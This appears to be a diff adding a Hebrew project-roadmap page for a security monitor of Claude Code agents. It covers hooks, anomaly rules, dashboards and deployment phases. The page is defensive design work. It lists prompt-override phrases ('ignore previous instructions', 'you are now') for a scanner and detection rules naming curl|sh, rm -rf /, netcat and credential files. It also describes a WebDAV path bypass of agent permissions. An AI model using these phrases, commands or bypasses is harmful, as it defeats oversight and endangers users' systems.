+    <div class="phase-num d" style="font-size:13px;width:48px;height:48px;background:linear-gradient(135deg,#a78bfa,#8b5cf6);">12</div>
+    <div class="phase-info">
+      <h3>שלב 12 — שיפורים מהמחקר (Gap Fix)</h3>
+      <p>תיקונים וכיסויים שעלו מ-Gap Analysis — מ-82% ל-95%+ כיסוי OWASP</p>
+    </div>
+    <div class="phase-status" style="background:rgba(188,140,255,0.12);color:#a78bfa;border:1px solid rgba(188,140,255,0.3);">📊 מחקר</div>
+  </div>
+
+  <!-- Intro note -->
+  <div style="padding:14px 20px;background:rgba(188,140,255,0.05);border-bottom:1px solid var(--border);font-size:12px;color:var(--muted2);">
+    כל הפריטים בשלב זה עלו מ-<strong style="color:#a78bfa;">Gap Analysis</strong> שבוצע מול מחקר OWASP LLM Top 10 + תיעוד Anthropic. מחולק ל-3 קטגוריות: קריטי / גבוה / שיפור.
+  </div>
+
+  <div class="tasks-grid">
+
+    <!-- CRITICAL -->
+    <div class="task-cell" style="border-top:3px solid var(--red);background:rgba(239,68,68,0.03);">
+      <div class="task-num" style="color:var(--red);">12.1 🔴</div>
+      <div class="task-title">WebDAV Block Rule</div>
+      <div class="task-desc">
+        Anthropic מזהירים: paths שמתחילים ב-<code style="color:#7dd3fc;">\\</code> ב-Windows עוקפים את Permission System דרך WebDAV.
+        הוסף ל-Signature Rules חוק ייעודי:<br>
+        <code style="color:#86efac;font-size:10px;">if (path.startsWith('\\\\')) → CRITICAL: WebDAV bypass</code><br>
+        כיסוי: OWASP LLM01 + Windows-specific.
+      </div>
+      <div class="task-tags"><span class="tag">rules.js</span><span class="tag">Windows</span><span class="tag">Milestone 2.1</span></div>
+    </div>
+
+    <div class="task-cell" style="border-top:3px solid var(--red);background:rgba(239,68,68,0.03);">
+      <div class="task-num" style="color:var(--red);">12.2 🔴</div>
+      <div class="task-title">ConfigChange Hook</div>
+      <div class="task-desc">
+        ללא זה — מישהו יכול לערוך <code style="color:#7dd3fc;">settings.json</code> ולכבות את EHZ-SEC-AI בשקט.
+        הוסף Hook מסוג <code style="color:#7dd3fc;">ConfigChange</code> (Anthropic מספקים זאת רשמית) שמשלח התראה מיידית:<br>
+        <code style="color:#86efac;font-size:10px;">"ConfigChange" → Telegram: ⚠️ הגדרות Claude שונו!</code>
+      </div>
+      <div class="task-tags"><span class="tag">hook.js</span><span class="tag">ConfigChange</span><span class="tag">Milestone 1.5</span></div>
+    </div>
+
+    <!-- HIGH -->
+    <div class="task-cell" style="border-top:3px solid var(--orange);background:rgba(249,115,22,0.03);">
+      <div class="task-num" style="color:var(--orange);">12.3 🟠</div>
+      <div class="task-title">Prompt Injection Content Scanner</div>
+      <div class="task-desc">
+        OWASP LLM01 — כרגע Context Rules בודקים רק פקודות. צריך גם לבדוק תוכן שClaude מקבל.
+        PostToolUse scanner על WebFetch/Read יחפש:<br>
+        <code style="color:#86efac;font-size:10px;">"ignore previous instructions", "you are now", "jailbreak", "DAN"</code>
+      </div>
+      <div class="task-tags"><span class="tag">PostToolUse</span><span class="tag">LLM01</span><span class="tag">Milestone 2.5</span></div>
+    </div>
+
+    <div class="task-cell" style="border-top:3px solid var(--orange);background:rgba(249,115,22,0.03);">
+      <div class="task-num" style="color:var(--orange);">12.4 🟠</div>
+      <div class="task-title">MCP-Specific Hook Matchers</div>
+      <div class="task-desc">
+        Anthropic מדגישים MCP כסיכון נפרד (LLM07). כרגע יש Hook כללי בלבד.
+        הוסף matchers ספציפיים:
+        <code style="color:#86efac;font-size:10px;">mcp__*__write* → HIGH</code>
+        <code style="color:#86efac;font-size:10px;">mcp__*__delete* → CRITICAL</code>
+        <code style="color:#86efac;font-size:10px;">mcp__*__exec* → CRITICAL</code>
+      </div>
+      <div class="task-tags"><span class="tag">MCP</span><span class="tag">LLM07</span><span class="tag">Milestone 2.6</span></div>
+    </div>
+
+    <div class="task-cell" style="border-top:3px solid var(--orange);background:rgba(249,115,22,0.03);">
+      <div class="task-num" style="color:var(--orange);">12.5 🟠</div>
+      <div class="task-title">Semgrep on Write — LLM02 Fix</div>
+      <div class="task-desc">
+        OWASP LLM02 (Insecure Output) — Write Guard קיים לסיסמאות, אבל לא לvulnerabilities.
+        הוסף PostToolUse על Write/Edit שמריץ Semgrep ובודק שהקוד שנכתב לא מכניס:
+        XSS, SQL Injection, Command Injection, Path Traversal.
+      </div>
+      <div class="task-tags"><span class="tag">Semgrep</span><span class="tag">LLM02</span><span class="tag">Milestone 6.5</span></div>
+    </div>
+
+    <!-- MEDIUM -->
+    <div class="task-cell" style="border-top:3px solid var(--yellow);background:rgba(245,158,11,0.03);">
+      <div class="task-num" style="color:var(--yellow);">12.6 🟡</div>
+      <div class="task-title">OpenTelemetry Export — Enterprise</div>
+      <div class="task-desc">
+        ארגונים עם Prometheus/Grafana/Datadog לא יכולים לשלב EHZ-SEC-AI ללא OTel.
+        הוסף ל-Collector export של events בפורמט OTel סטנדרטי — כך EHZ-SEC-AI
+        מדבר עם תשתית ניטור קיימת ולא מחליף אותה. רלוונטי לשלב ב' (Domain).
+      </div>
+      <div class="task-tags"><span class="tag">OTel</span><span class="tag">Enterprise</span><span class="tag">Milestone 9+</span></div>
+    </div>
+
+    <div class="task-cell" style="border-top:3px solid var(--yellow);background:rgba(245,158,11,0.03);">
+      <div class="task-num" style="color:var(--yellow);">12.7 🟡</div>
+      <div class="task-title">Session Replay Enhancement — LLM09</div>
+      <div class="task-desc">
+        OWASP LLM09 (Overreliance) — Session Recording קיים (Milestone 7.2) אבל לא כולל
+        ניתוח אוטומטי. הוסף: ציון "אמינות תשובה" לכל session, דגל אוטומטי על תשובות
+        שמבוססות על מידע חיצוני לא מאומת.
+      </div>
+      <div class="task-tags"><span class="tag">Session</span><span class="tag">LLM09</span><span class="tag">Milestone 7+</span></div>
+    </div>
+
+  </div>
+
+  <!-- Summary bar -->
+  <div style="padding:16px 20px;border-top:1px solid var(--border);background:rgba(0,0,0,0.2);">
+    <div style="font-size:11px;font-weight:700;letter-spacing:1.5px;color:var(--muted2);text-transform:uppercase;margin-bottom:12px;">השפעה על כיסוי OWASP לאחר יישום</div>
+    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:8px;">
+      <div style="background:rgba(239,68,68,0.07);border:1px solid rgba(239,68,68,0.2);border-radius:8px;padding:8px 12px;font-size:11px;">
+        <div style="color:var(--red);font-weight:700;">LLM01 Prompt Inj.</div>
+        <div style="color:var(--muted2);">60% → <span style="color:var(--green);font-weight:700;">90%</span></div>
+      </div>
+      <div style="background:rgba(249,115,22,0.07);border:1px solid rgba(249,115,22,0.2);border-radius:8px;padding:8px 12px;font-size:11px;">
+        <div style="color:var(--orange);font-weight:700;">LLM02 Output</div>
+        <div style="color:var(--muted2);">55% → <span style="color:var(--green);font-weight:700;">85%</span></div>
+      </div>
+      <div style="background:rgba(249,115,22,0.07);border:1px solid rgba(249,115,22,0.2);border-radius:8px;padding:8px 12px;font-size:11px;">
+        <div style="color:var(--orange);font-weight:700;">LLM07 Plugin/MCP</div>
+        <div style="color:var(--muted2);">70% → <span style="color:var(--green);font-weight:700;">95%</span></div>
+      </div>
+      <div style="background:rgba(16,185,129,0.07);border:1px solid rgba(16,185,129,0.2);border-radius:8px;padding:8px 12px;font-size:11px;">
+        <div style="color:var(--green);font-weight:700;">כיסוי כולל</div>
+        <div style="color:var(--muted2);">82% → <span style="color:var(--green);font-weight:900;font-size:13px;">95%+</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div style="background:rgba(16,185,129,0.07);border-top:1px solid var(--border);padding:12px 20px;font-size:12px;">
+    <span style="color:var(--green);font-weight:700;">✅ בדיקת קבלה:</span>
+    <span style="color:var(--muted2);"> נסה לכתוב לpath עם <code style="color:#7dd3fc;">\\</code> → CRITICAL WebDAV alert → ערוך settings.json → קבל Telegram ConfigChange → שלח "ignore previous instructions" בWebFetch → זוהה כInjection</span>
+  </div>
+</div>
+
+<!-- Master timeline -->
+<div class="hw-card" style="margin-bottom: 24px; overflow-x:auto;">
+  <div class="hw-card-title">ציר זמן — 12 Milestones</div>
+  <div style="display:flex;gap:0;margin-top:14px;min-width:700px;">
+    <div style="flex:1;text-align:center;padding:10px 3px;border-left:1px solid var(--border);border-top:3px solid var(--accent);">
+      <div style="font-size:15px;font-weight:900;color:var(--accent);">1</div>
+      <div style="font-size:8px;color:var(--muted2);margin-top:4px;line-height:1.5;">Hook<br>Collector<br>Telegram</div>
+    </div>
+    <div style="flex:1;text-align:center;padding:10px 3px;border-left:1px solid var(--border);border-top:3px solid var(--accent);">
+      <div style="font-size:15px;font-weight:900;color:var(--accent);">2</div>
+      <div style="font-size:8px;color:var(--muted2);margin-top:4px;line-height:1.5;">Anomaly<br>Rules</div>
+    </div>
+    <div style="flex:1;text-align:center;padding:10px 3px;border-left:1px solid var(--border);border-top:3px solid var(--accent);">
+      <div style="font-size:15px;font-weight:900;color:var(--accent);">3</div>
+      <div style="font-size:8px;color:var(--muted2);margin-top:4px;line-height:1.5;">Dashboard<br>UI</div>
+    </div>
+    <div style="flex:1;text-align:center;padding:10px 3px;border-left:1px solid var(--border);border-top:3px solid var(--orange);">
+      <div style="font-size:15px;font-weight:900;color:var(--orange);">4</div>
+      <div style="font-size:8px;color:var(--muted2);margin-top:4px;line-height:1.5;">Hardening<br>Levels</div>
+    </div>
+    <div style="flex:1;text-align:center;padding:10px 3px;border-left:1px solid var(--border);border-top:3px solid var(--orange);">
+      <div style="font-size:15px;font-weight:900;color:var(--orange);">5</div>
+      <div style="font-size:8px;color:var(--muted2);margin-top:4px;line-height:1.5;">Skill<br>Scanner</div>
+    </div>
+    <div style="flex:1;text-align:center;padding:10px 3px;border-left:1px solid var(--border);border-top:3px solid var(--red);">
+      <div style="font-size:15px;font-weight:900;color:var(--red);">6</div>
+      <div style="font-size:8px;color:var(--muted2);margin-top:4px;line-height:1.5;">Secrets<br>DLP</div>
+    </div>
+    <div style="flex:1;text-align:center;padding:10px 3px;border-left:1px solid var(--border);border-top:3px solid var(--purple);">
+      <div style="font-size:15px;font-weight:900;color:var(--purple);">7</div>
+      <div style="font-size:8px;color:var(--muted2);margin-top:4px;line-height:1.5;">Advanced<br>Monitor</div>
+    </div>
+    <div style="flex:1;text-align:center;padding:10px 3px;border-left:1px solid var(--border);border-top:3px solid var(--green);">
+      <div style="font-size:15px;font-weight:900;color:var(--green);">8</div>
+      <div style="font-size:8px;color:var(--muted2);margin-top:4px;line-height:1.5;">📦 Installer<br>Package</div>
+    </div>
+    <div style="flex:1;text-align:center;padding:10px 3px;border-left:1px solid var(--border);border-top:3px solid var(--yellow);">
+      <div style="font-size:15px;font-weight:900;color:var(--yellow);">9</div>
+      <div style="font-size:8px;color:var(--muted2);margin-top:4px;line-height:1.5;">Domain<br>Kamatera</div>
+    </div>
+    <div style="flex:1;text-align:center;padding:10px 3px;border-left:1px solid var(--border);border-top:3px solid var(--red);">
+      <div style="font-size:15px;font-weight:900;color:var(--red);">10</div>
+      <div style="font-size:8px;color:var(--muted2);margin-top:4px;line-height:1.5;">Block<br>Mode</div>
+    </div>
+    <div style="flex:1;text-align:center;padding:10px 3px;border-left:1px solid var(--border);border-top:3px solid var(--green);">
+      <div style="font-size:15px;font-weight:900;color:var(--green);">11</div>
+      <div style="font-size:8px;color:var(--muted2);margin-top:4px;line-height:1.5;">SIEM<br>Network</div>
+    </div>
+    <div style="flex:1;text-align:center;padding:10px 3px;border-top:3px solid #a78bfa;">
+      <div style="font-size:15px;font-weight:900;color:#a78bfa;">12</div>
+      <div style="font-size:8px;color:var(--muted2);margin-top:4px;line-height:1.5;">Gap<br>Fix</div>
+    </div>
+  </div>
+  <div style="display:flex;gap:16px;flex-wrap:wrap;margin-top:14px;padding-top:10px;border-top:1px solid var(--border);font-size:11px;">
+    <span><span style="color:var(--accent);">■</span> שלב א — Core (1-3)</span>
+    <span><span style="color:var(--orange);">■</span> שלב א — Security (4-6)</span>
+    <span><span style="color:var(--purple);">■</span> שלב א — Monitor (7)</span>
+    <span><span style="color:var(--green);">■</span> Installer Package (8)</span>
+    <span><span style="color:var(--yellow);">■</span> שלב ב — Domain (9)</span>
+    <span><span style="color:var(--red);">■</span> שלב ג/ד — Block+SIEM (10-11)</span>
+    <span><span style="color:#a78bfa;">■</span> Gap Fix — שיפורים מחקר (12)</span>
+  </div>
+</div>
+
+<!-- HARDWARE REQUIREMENTS -->
+<div class="section-title">דרישות חומרה — שלב א' (תחנה יחידה)</div>
+<div class="hw-grid">
+
+  <div class="hw-card">
+    <div class="hw-card-title">מינימום — Collector + Dashboard</div>
+    <div class="hw-row"><span class="hw-label">CPU</span><span class="hw-value min">2 Cores (כלשהו)</span></div>
+    <div class="hw-row"><span class="hw-label">RAM</span><span class="hw-value min">4 GB</span></div>
+    <div class="hw-row"><span class="hw-label">דיסק</span><span class="hw-value min">10 GB פנויים</span></div>
+    <div class="hw-row"><span class="hw-label">OS</span><span class="hw-value min">Windows 10/11</span></div>
+    <div class="hw-row"><span class="hw-label">Node.js</span><span class="hw-value min">18+</span></div>
+  </div>
+
+  <div class="hw-card">
+    <div class="hw-card-title">מומלץ — ביצועים טובים</div>
+    <div class="hw-row"><span class="hw-label">CPU</span><span class="hw-value ok">4 Cores+</span></div>
+    <div class="hw-row"><span class="hw-label">RAM</span><span class="hw-value ok">8 GB+</span></div>
+    <div class="hw-row"><span class="hw-label">דיסק</span><span class="hw-value ok">SSD — 20 GB</span></div>
+    <div class="hw-row"><span class="hw-label">OS</span><span class="hw-value ok">Windows 11</span></div>
+    <div class="hw-row"><span class="hw-label">Node.js</span><span class="hw-value ok">20 LTS</span></div>
+  </div>
+
+  <div class="hw-card">
+    <div class="hw-card-title">עומסים צפויים (בודד)</div>
+    <div class="hw-row"><span class="hw-label">Events/שעה</span><span class="hw-value ok">~200–500</span></div>
+    <div class="hw-row"><span class="hw-label">DB גדילה</span><span class="hw-value ok">~5 MB ליום</span></div>
+    <div class="hw-row"><span class="hw-label">RAM Collector</span><span class="hw-value ok">~50 MB</span></div>
+    <div class="hw-row"><span class="hw-label">RAM Dashboard</span><span class="hw-value ok">~30 MB</span></div>
+    <div class="hw-row"><span class="hw-label">CPU Hook</span><span class="hw-value ok">&lt;5ms לאירוע</span></div>
+  </div>
+
+</div>
+<div class="hw-note">
+  ✅ המחשב הנוכחי עומד בכל הדרישות — Collector + Dashboard + Agent רצים על אותה תחנה. אין צורך בשרת נפרד בשלב א'.
+</div>
+
+<!-- HARDWARE PHASE B -->
+<div class="section-title">דרישות חומרה ותוכנה — שלב ב' (Domain Enterprise)</div>
+
+<div class="hw-grid">
+
+  <div class="hw-card">
+    <div class="hw-card-title">שרת CCSM-SERVER — מינימום</div>
+    <div class="hw-row"><span class="hw-label">CPU</span><span class="hw-value warn">4 Cores</span></div>
+    <div class="hw-row"><span class="hw-label">RAM</span><span class="hw-value warn">8 GB</span></div>
+    <div class="hw-row"><span class="hw-label">דיסק</span><span class="hw-value warn">SSD 50 GB</span></div>
+    <div class="hw-row"><span class="hw-label">רשת</span><span class="hw-value warn">1 Gbps LAN</span></div>
+    <div class="hw-row"><span class="hw-label">OS</span><span class="hw-value warn">Windows Server 2019 / Ubuntu 22.04</span></div>
+  </div>
+
+  <div class="hw-card">
+    <div class="hw-card-title">שרת CCSM-SERVER — מומלץ</div>
+    <div class="hw-row"><span class="hw-label">CPU</span><span class="hw-value ok">8 Cores+</span></div>
+    <div class="hw-row"><span class="hw-label">RAM</span><span class="hw-value ok">16 GB+</span></div>
+    <div class="hw-row"><span class="hw-label">דיסק</span><span class="hw-value ok">SSD 200 GB (RAID-1)</span></div>
+    <div class="hw-row"><span class="hw-label">רשת</span><span class="hw-value ok">1 Gbps + Static IP</span></div>
+    <div class="hw-row"><span class="hw-label">OS</span><span class="hw-value ok">Windows Server 2022 / Ubuntu 24.04</span></div>
+  </div>
+
+  <div class="hw-card">
+    <div class="hw-card-title">עומסים צפויים (Domain)</div>
+    <div class="hw-row"><span class="hw-label">תחנות מנוטרות</span><span class="hw-value ok">עד 500</span></div>
+    <div class="hw-row"><span class="hw-label">Events/שעה</span><span class="hw-value ok">~50,000</span></div>
+    <div class="hw-row"><span class="hw-label">DB גדילה</span><span class="hw-value ok">~500 MB ליום</span></div>
+    <div class="hw-row"><span class="hw-label">שמירת היסטוריה</span><span class="hw-value ok">90 יום (ברירת מחדל)</span></div>
+    <div class="hw-row"><span class="hw-label">חיבורים במקביל</span><span class="hw-value ok">עד 500 agents</span></div>
+  </div>
+
+  <div class="hw-card">
+    <div class="hw-card-title">תחנות קצה (מנוטרות)</div>
+    <div class="hw-row"><span class="hw-label">OS</span><span class="hw-value ok">Windows 10/11</span></div>
+    <div class="hw-row"><span class="hw-label">Node.js</span><span class="hw-value ok">18+ (לAgent)</span></div>
+    <div class="hw-row"><span class="hw-label">Claude Code</span><span class="hw-value ok">חייב להיות מותקן</span></div>
+    <div class="hw-row"><span class="hw-label">RAM נוסף לAgent</span><span class="hw-value ok">~20 MB בלבד</span></div>
+    <div class="hw-row"><span class="hw-label">גישת רשת לשרת</span><span class="hw-value ok">port 3010 פנימי</span></div>
+  </div>
+
+</div>
+
+<!-- SOFTWARE REQUIREMENTS PHASE B -->
+<div style="margin-top: 20px;">
+<div class="section-title">דרישות תוכנה — שלב ב'</div>
+
+<div class="hw-grid">
+
+  <div class="hw-card">
+    <div class="hw-card-title">שרת — תוכנות חובה</div>
+    <div class="hw-row"><span class="hw-label">Node.js</span><span class="hw-value ok">20 LTS</span></div>
+    <div class="hw-row"><span class="hw-label">PostgreSQL</span><span class="hw-value ok">15+</span></div>
+    <div class="hw-row"><span class="hw-label">nginx</span><span class="hw-value ok">Reverse proxy + SSL</span></div>
+    <div class="hw-row"><span class="hw-label">PM2</span><span class="hw-value ok">Process manager</span></div>
+    <div class="hw-row"><span class="hw-label">OpenSSL</span><span class="hw-value ok">ליצירת תעודות mTLS</span></div>
+  </div>
+
+  <div class="hw-card">
+    <div class="hw-card-title">Active Directory — דרישות</div>
+    <div class="hw-row"><span class="hw-label">Domain Functional Level</span><span class="hw-value ok">2016+</span></div>
+    <div class="hw-row"><span class="hw-label">LDAP</span><span class="hw-value ok">port 389 / LDAPS 636</span></div>
+    <div class="hw-row"><span class="hw-label">קבוצות AD</span><span class="hw-value ok">CCSM-Admins, CCSM-Analysts</span></div>
+    <div class="hw-row"><span class="hw-label">Service Account</span><span class="hw-value ok">ccsm-svc (read-only LDAP)</span></div>
+    <div class="hw-row"><span class="hw-label">GPO Rights</span><span class="hw-value ok">הרשאת Create/Link GPO</span></div>
+  </div>
+
+  <div class="hw-card">
+    <div class="hw-card-title">רשת — פורטים נדרשים</div>
+    <div class="hw-row"><span class="hw-label">3010</span><span class="hw-value ok">Collector API (פנימי)</span></div>
+    <div class="hw-row"><span class="hw-label">3011</span><span class="hw-value ok">Dashboard Web UI</span></div>
+    <div class="hw-row"><span class="hw-label">443</span><span class="hw-value ok">HTTPS (nginx)</span></div>
+    <div class="hw-row"><span class="hw-label">5432</span><span class="hw-value min">PostgreSQL (לשרת בלבד)</span></div>
+    <div class="hw-row"><span class="hw-label">389 / 636</span><span class="hw-value ok">LDAP / LDAPS לAD</span></div>
+  </div>
+
+  <div class="hw-card">
+    <div class="hw-card-title">אופציונלי — SIEM</div>
+    <div class="hw-row"><span class="hw-label">Syslog</span><span class="hw-value min">UDP/TCP 514</span></div>
+    <div class="hw-row"><span class="hw-label">Microsoft Sentinel</span><span class="hw-value min">REST API + Workspace ID</span></div>
+    <div class="hw-row"><span class="hw-label">Splunk HEC</span><span class="hw-value min">HTTP Event Collector token</span></div>
+    <div class="hw-row"><span class="hw-label">QRadar</span><span class="hw-value min">Syslog + DSM</span></div>
+    <div class="hw-row"><span class="hw-label">Elastic SIEM</span><span class="hw-value min">Filebeat / REST</span></div>
+  </div>
+
+</div>
+
+<div class="hw-note" style="background: rgba(249,115,22,0.08); border-color: rgba(249,115,22,0.25); color: var(--orange); margin-top: 12px;">
+  ⚠️ שלב ב' דורש שרת ייעודי עם גישה ל-Active Directory. מומלץ VM על Hyper-V / VMware קיים בתשתית.
+  PostgreSQL חייב לרוץ על אותו שרת או Sub-net פנימי בלבד — לא חשוף לאינטרנט.
+</div>
+</div>
+
+<!-- PHASE A -->
+<div class="section-title">שלבי פיתוח</div>
+
+<div class="phase-block">
+  <div class="phase-header">
+    <div class="phase-num a">א</div>
+    <div class="phase-info">
+      <h3>שלב א — תחנה יחידה (Standalone)</h3>
+      <p>Agent hooks + Collector מקומי + Dashboard בסיסי — הכל על מחשב אחד</p>
+    </div>
+    <div class="phase-status status-active">▶ פעיל כעת</div>
+  </div>
+  <div class="tasks-grid">
+    <div class="task-cell">
+      <div class="task-num">A-01</div>
+      <div class="task-title">Agent Hook</div>
+      <div class="task-desc">סקריפט hook.js שרץ ב-PreToolUse / PostToolUse. בדיקת חוקים מקומית, שליחה async ל-Collector.</div>
+      <div class="task-tags"><span class="tag">Node.js</span><span class="tag">hooks</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">A-02</div>
+      <div class="task-title">Anomaly Rules Engine</div>
+      <div class="task-desc">חוקי זיהוי: curl|sh, rm -rf /, sensitive files, IP URLs, base64 decode, netcat. CRITICAL / HIGH / MEDIUM / LOW.</div>
+      <div class="task-tags"><span class="tag">rules.js</span><span class="tag">regex</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">A-03</div>
+      <div class="task-title">Collector — SQLite</div>
+      <div class="task-desc">Express server port 3010. קבלת events, שמירה ב-SQLite, endpoints לDashboard, Telegram alerts.</div>
+      <div class="task-tags"><span class="tag">Express</span><span class="tag">SQLite</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">A-04</div>
+      <div class="task-title">Dashboard — Web UI</div>
+      <div class="task-desc">ממשק Checkpoint-style. ציון אבטחה, timeline, events table, פילטרים לפי severity/tool/תאריך.</div>
+      <div class="task-tags"><span class="tag">HTML</span><span class="tag">Chart.js</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">A-05</div>
+      <div class="task-title">Telegram Alerts</div>
+      <div class="task-desc">התראה מיידית על CRITICAL/HIGH. כולל machine, user, tool, rule שהופעל.</div>
+      <div class="task-tags"><span class="tag">Bot API</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">A-06</div>
+      <div class="task-title">Installer — ccsm install</div>
+      <div class="task-desc">סקריפט התקנה אוטומטי: בדיקת Claude Code, כתיבת hooks לsettings.json, יצירת machine token.</div>
+      <div class="task-tags"><span class="tag">CLI</span><span class="tag">PowerShell</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- PHASE B -->
+<div class="phase-block">
+  <div class="phase-header">
+    <div class="phase-num b">ב</div>
+    <div class="phase-info">
+      <h3>שלב ב — Domain מיקרוסופט (Enterprise)</h3>
+      <p>פריסה ב-GPO, PostgreSQL, AD Auth, RBAC, שרת מרכזי</p>
+    </div>
+    <div class="phase-status status-next">⏳ הבא</div>
+  </div>
+  <div class="tasks-grid">
+    <div class="task-cell">
+      <div class="task-num">B-01</div>
+      <div class="task-title">GPO Deploy Script</div>
+      <div class="task-desc">PowerShell: בדיקת Claude Code, התקנה, רישום hooks. רץ כ-Startup Script בכל תחנה.</div>
+      <div class="task-tags"><span class="tag">GPO</span><span class="tag">PowerShell</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">B-02</div>
+      <div class="task-title">PostgreSQL + Migration</div>
+      <div class="task-desc">מעבר מ-SQLite לPostgres. תמיכה בעשרות מחשבים במקביל, indices, archiving.</div>
+      <div class="task-tags"><span class="tag">PostgreSQL</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">B-03</div>
+      <div class="task-title">AD Authentication</div>
+      <div class="task-desc">כניסה לDashboard עם Active Directory. LDAP bind, קריאת קבוצות, מיפוי לRole.</div>
+      <div class="task-tags"><span class="tag">LDAP</span><span class="tag">AD</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">B-04</div>
+      <div class="task-title">RBAC — הרשאות</div>
+      <div class="task-desc">Admin / Analyst / ReadOnly. כל דף ו-API מוגן לפי role. ניהול משתמשים מהDashboard.</div>
+      <div class="task-tags"><span class="tag">RBAC</span><span class="tag">JWT</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">B-05</div>
+      <div class="task-title">Multi-Machine View</div>
+      <div class="task-desc">מפת תחנות: כמה active, כמה alerts בכל תחנה, last seen, agent version.</div>
+      <div class="task-tags"><span class="tag">Dashboard</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">B-06</div>
+      <div class="task-title">mTLS — תקשורת מאובטחת</div>
+      <div class="task-desc">Agent ↔ Collector עם אישורים הדדיים. מניעת שליחת events מתחנות לא מורשות.</div>
+      <div class="task-tags"><span class="tag">TLS</span><span class="tag">PKI</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- PHASE C -->
+<div class="phase-block">
+  <div class="phase-header">
+    <div class="phase-num c">ג</div>
+    <div class="phase-info">
+      <h3>שלב ג — Block Mode (חסימה אקטיבית)</h3>
+      <p>Agent עובר ממצב ניטור למצב חסימה — exit(1) עצור את Claude</p>
+    </div>
+    <div class="phase-status status-future">עתידי</div>
+  </div>
+  <div class="tasks-grid">
+    <div class="task-cell">
+      <div class="task-num">C-01</div>
+      <div class="task-title">Block Engine</div>
+      <div class="task-desc">hook מחזיר exit(1) לClaude Code לפי חוק — Claude נעצר לפני הפעולה. חוקי CRITICAL בלבד.</div>
+      <div class="task-tags"><span class="tag">hooks</span><span class="tag">block</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">C-02</div>
+      <div class="task-title">Whitelist / Exceptions</div>
+      <div class="task-desc">ניהול חריגים: URLs מורשות, פקודות מאושרות, משתמשים בעלי הרשאת override.</div>
+      <div class="task-tags"><span class="tag">Policy</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">C-03</div>
+      <div class="task-title">Block Dashboard</div>
+      <div class="task-desc">ממשק לניהול מדיניות חסימה. מה חסום? מה מאושר? מי יכול לאשר override?</div>
+      <div class="task-tags"><span class="tag">Policy UI</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- PHASE D -->
+<div class="phase-block">
+  <div class="phase-header">
+    <div class="phase-num d">ד</div>
+    <div class="phase-info">
+      <h3>שלב ד — SIEM Integration</h3>
+      <p>שליחת events לכלי SIEM חיצוניים — Splunk, Microsoft Sentinel, QRadar</p>
+    </div>
+    <div class="phase-status status-future">עתידי</div>
+  </div>
+  <div class="tasks-grid">
+    <div class="task-cell">
+      <div class="task-num">D-01</div>
+      <div class="task-title">Syslog Connector</div>
+      <div class="task-desc">שליחת events בפורמט RFC 5424. UDP/TCP. מיפוי severity לPriority. תואם כל SIEM.</div>
+      <div class="task-tags"><span class="tag">Syslog</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">D-02</div>
+      <div class="task-title">REST API Export</div>
+      <div class="task-desc">Webhook/pull API. JSON פורמט. פילטר לפי severity, מחשב, תאריך. API key auth.</div>
+      <div class="task-tags"><span class="tag">REST</span><span class="tag">JSON</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">D-03</div>
+      <div class="task-title">Sentinel / Splunk Templates</div>
+      <div class="task-desc">KQL queries מוכנות לMicrosoft Sentinel. Splunk dashboards templates. ייבוא מיידי.</div>
+      <div class="task-tags"><span class="tag">KQL</span><span class="tag">SPL</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- LAB ENVIRONMENT -->
+<div class="section-title">סביבת בדיקות — Domain Lab</div>
+
+<!-- Lab Options tabs-style -->
+<div style="display:flex; gap:12px; margin-bottom:20px; flex-wrap:wrap;">
+  <div style="background:rgba(14,165,233,0.12); border:1px solid rgba(14,165,233,0.3); border-radius:10px; padding:10px 18px; font-size:13px; font-weight:700; color:var(--accent);">✅ מומלץ — Hyper-V מקומי</div>
+  <div style="background:var(--panel); border:1px solid var(--border); border-radius:10px; padding:10px 18px; font-size:13px; font-weight:600; color:var(--muted);">☁️ אפשרות ב — Cloud Lab</div>
+  <div style="background:var(--panel); border:1px solid var(--border); border-radius:10px; padding:10px 18px; font-size:13px; font-weight:600; color:var(--muted);">⚡ אפשרות ג — ללא DC (מהיר)</div>
+</div>
+
+<!-- Hyper-V Requirements -->
+<div class="hw-card" style="margin-bottom:16px;">
+  <div class="hw-card-title">דרישות מינימום — Hyper-V על המחשב הנוכחי</div>
+  <div style="display:grid; grid-template-columns:repeat(auto-fill,minmax(200px,1fr)); gap:0;">
+    <div class="hw-row"><span class="hw-label">RAM פנוי</span><span class="hw-value warn">מינימום 12 GB</span></div>
+    <div class="hw-row"><span class="hw-label">דיסק פנוי</span><span class="hw-value warn">60–80 GB</span></div>
+    <div class="hw-row"><span class="hw-label">CPU</span><span class="hw-value ok">4+ cores</span></div>
+    <div class="hw-row"><span class="hw-label">OS</span><span class="hw-value ok">Windows 11 Pro/Enterprise</span></div>
+    <div class="hw-row"><span class="hw-label">Feature</span><span class="hw-value ok">Hyper-V מופעל</span></div>
+  </div>
+</div>
+
+<!-- 3 VMs -->
+<div class="hw-grid" style="margin-bottom:16px;">
+
+  <div class="hw-card" style="border-top: 3px solid #6366f1;">
+    <div class="hw-card-title" style="color:#a5b4fc;">VM-1 — Domain Controller</div>
+    <div class="hw-row"><span class="hw-label">שם</span><span class="hw-value" style="color:#a5b4fc;">CORP-DC01</span></div>
+    <div class="hw-row"><span class="hw-label">OS</span><span class="hw-value ok">Windows Server 2022 Eval</span></div>
+    <div class="hw-row"><span class="hw-label">CPU / RAM</span><span class="hw-value ok">2 vCores / 2 GB</span></div>
